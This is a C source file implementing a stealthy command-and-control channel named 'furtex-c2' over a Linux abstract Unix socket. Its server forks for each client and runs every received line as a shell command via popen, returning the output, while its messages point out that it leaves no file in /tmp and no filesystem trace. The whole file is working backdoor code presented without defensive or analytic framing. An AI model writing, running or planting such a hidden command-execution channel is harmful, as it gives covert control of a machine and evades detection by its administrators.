#define _GNU_SOURCE
#include <sys/socket.h>
#include <sys/un.h>
#include <sys/wait.h>
#include <stddef.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <poll.h>
#include <errno.h>

#define SOCK_NAME  "furtex-c2"
#define BUF_MAX    65536

static int make_addr(struct sockaddr_un *sa, socklen_t *len, const char *name)
{
    memset(sa, 0, sizeof(*sa));
    sa->sun_family = AF_UNIX;
    sa->sun_path[0] = '\0';
    strncpy(sa->sun_path + 1, name, sizeof(sa->sun_path) - 2);
    *len = (socklen_t)(offsetof(struct sockaddr_un, sun_path) + 1 + strlen(name));
    return 0;
}

static void run_server(const char *name)
{
    int lfd = socket(AF_UNIX, SOCK_STREAM, 0);
    if (lfd < 0) { perror("socket"); return; }

    struct sockaddr_un sa;
    socklen_t salen;
    make_addr(&sa, &salen, name);

    if (bind(lfd, (struct sockaddr *)&sa, salen) < 0) {
        perror("bind (abstract)"); close(lfd); return;
    }
    if (listen(lfd, 4) < 0) { perror("listen"); close(lfd); return; }

    printf("[*] abstract socket server: \\0%s\n", name);
    printf("[*] no file in /tmp - only visible via: ss -xlp | grep %s\n", name);

    for (;;) {
        int cfd = accept(lfd, NULL, NULL);
        if (cfd < 0) { perror("accept"); continue; }

        pid_t pid = fork();
        if (pid < 0) { perror("fork"); close(cfd); continue; }
        if (pid > 0) { close(cfd); continue; }

        close(lfd);
        char buf[4096];
        for (;;) {
            ssize_t n = recv(cfd, buf, sizeof(buf)-1, 0);
            if (n <= 0) break;
            buf[n] = '\0';
            buf[strcspn(buf, "\n")] = '\0';
            if (strcmp(buf, "exit") == 0) break;

            FILE *f = popen(buf, "r");
            if (!f) { dprintf(cfd, "[!] popen failed\n"); continue; }

            char out[BUF_MAX];
            size_t total = 0, r;
            while ((r = fread(out + total, 1, sizeof(out) - total - 1, f)) > 0)
                total += r;
            pclose(f);

            if (total == 0) { dprintf(cfd, "[no output]\n"); continue; }
            out[total] = '\0';
            send(cfd, out, total, 0);
        }
        close(cfd);
        _exit(0);
    }
}

static void run_client(const char *name)
{
    int fd = socket(AF_UNIX, SOCK_STREAM, 0);
    if (fd < 0) { perror("socket"); return; }

    struct sockaddr_un sa;
    socklen_t salen;
    make_addr(&sa, &salen, name);

    if (connect(fd, (struct sockaddr *)&sa, salen) < 0) {
        perror("connect"); close(fd); return;
    }
    printf("[*] connected to \\0%s (no filesystem trace)\n", name);

    char cmd[4096], out[BUF_MAX];
    for (;;) {
        printf("cmd> "); fflush(stdout);
        if (!fgets(cmd, sizeof(cmd), stdin)) break;
        if (send(fd, cmd, strlen(cmd), 0) < 0) { perror("send"); break; }

        if (strncmp(cmd, "exit", 4) == 0) break;

        struct pollfd pfd = { .fd = fd, .events = POLLIN };
        if (poll(&pfd, 1, 5000) <= 0) { printf("[timeout]\n"); continue; }

        ssize_t n = recv(fd, out, sizeof(out)-1, 0);
        if (n <= 0) break;
        out[n] = '\0';
        fputs(out, stdout);
    }
    close(fd);
}

int main(int argc, char *argv[])
{
    const char *name = argc >= 3 ? argv[2] : SOCK_NAME;

    if (argc >= 2 && strcmp(argv[1], "server") == 0) {
        run_server(name);
        return 0;
    }
    if (argc >= 2 && strcmp(argv[1], "client") == 0) {
        run_client(name);
        return 0;
    }

        fprintf(stderr, "usage: %s <server|client>\n", argv[0]);
    return 1;
}
